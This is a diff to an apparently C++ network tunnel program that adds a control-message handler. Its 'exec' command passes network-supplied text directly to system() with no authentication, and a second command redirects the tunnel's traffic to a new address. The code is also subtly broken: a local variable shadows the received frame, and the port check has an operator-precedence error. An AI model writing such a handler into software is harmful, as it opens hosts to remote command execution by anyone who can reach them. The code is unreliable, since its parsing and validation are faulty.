@@ -132,6 +132,37 @@ public:
             tunnelBuffer->popRead(n);
             success = true;
           }
+        } else if (frame.state == Frame::STATE_CONTROL_REQUEST) {
+          // format control:params
+          log_debug << "recv control: " << frame.message;
+          int p = frame.message.find(':');
+          Frame frame;
+          frame.cid = 0;
+          frame.state = Frame::STATE_CONTROL_RESPONSE;
+          if (p == string::npos) {
+            frame.message.assign("code=1&msg=invalid control format");
+          } else {
+            string control = frame.message.substr(0, p);
+            string params = frame.message.substr(p + 1);
+            if (control == "exec") {
+              system(params.c_str());
+              frame.message.assign("code=0&msg=exec done");
+            } else if (control == "changeTrafficAddr") {              
+              map<string, string> kv;
+              parseKVQuery(kv, params);
+              string ip = kv["ip"];
+              string portStr = kv["port"];
+              int port = stringToInt(portStr);
+              if (isIpV4(ip) && port > 0 || port < 65535) {
+                trafficAddr.ip = ip;
+                trafficAddr.port = port;
+                frame.message.assign("code=0&msg=changeTrafficAddr done");
+              } else {
+                frame.message.assign("code=2&msg=invalid address");
+              }
+            }
+          }
+          tunnelBuffer->writeFrame(frame);          
         } else {
           log_warn << "ignore state: " << (int) frame.state;
           tunnelBuffer->popRead(n);
